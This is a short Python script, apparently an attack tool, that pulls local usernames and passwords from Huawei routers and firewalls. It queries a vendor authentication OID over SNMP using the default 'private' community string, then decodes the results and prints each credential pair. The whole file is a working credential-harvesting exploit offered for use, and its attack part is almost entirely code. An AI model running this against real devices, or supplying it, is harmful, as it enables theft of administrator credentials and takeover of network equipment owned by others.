#!/usr/bin/python
"""
Simple tool to extract local users and passwords from most Huawei routers/firewalls.
Author: RJ
"""

import os
import sys
import argparse
import subprocess


parser = argparse.ArgumentParser()
parser.add_argument('-t',dest='target', action='store',required=True,
    help="The IP address of the target")
parser.add_argument('-p', dest='port', action='store',default="161",
    help="Set the target port.")
parser.add_argument('-c', dest='community', action='store',default="private",
    help="Community string to use")
parser.add_argument('-v', dest='version', action='store',default="2c",
    help="Community version to use")
arg = parser.parse_args()



walkpath = 'snmpwalk' #add to ../../net-snmp/apps/ to PATH or make install snmpwalk or put the full path here
mib = '1.3.6.1.4.1.2011.5.2.1.10' #MIB for auth data

host = arg.target
port = arg.port #this shouldn't need to be changed
community = arg.community
c_version = arg.version

snmpcmd = "{wp} -v {v} -c {c} {h}:{p} {m}".format(wp=walkpath,v=c_version,c=community,h=host,p=port,m=mib)

print "\033[93m[*]\033[0m Attempting to extract data through snmp... %s"%host

process = subprocess.Popen(snmpcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
result = process.communicate()

if "snmpwalk: not found" in result[1]:
    print "\033[91m[-]\033[0m Please check the path for snmpwalk and try again."
if "Timeout" in result[1]:
    print "\033[91m[-]\033[0m Connection to host timed-out."
    sys.exit(1)

users = []
passwords = []

result = result[0].split('iso')

for r in result:
    if "Hex-STRING" in r:
        r = r.replace('\n','')
        i = r.index("Hex-STRING")
        user = r[i+12:r.index("20",i)].replace(' ','') #get username and include login domain
        users.append(user.decode('hex').strip())

    elif "STRING:" in r:
        i = r.index("STRING:")
        password = r[i+9:len(r)-2]
        passwords.append(password)

        if len(passwords) == len(users):
            print "\n\033[92m[+]\033[0m Passwords extracted for %i users"%len(users)
            break

for i in range(len(users)):
    print "\033[92m[+]\033[0m User: %s Password: %s"%(users[i],passwords[i])

if len(users) == 0:
    print "\033[91m[-]\033[0m Extracting local users"

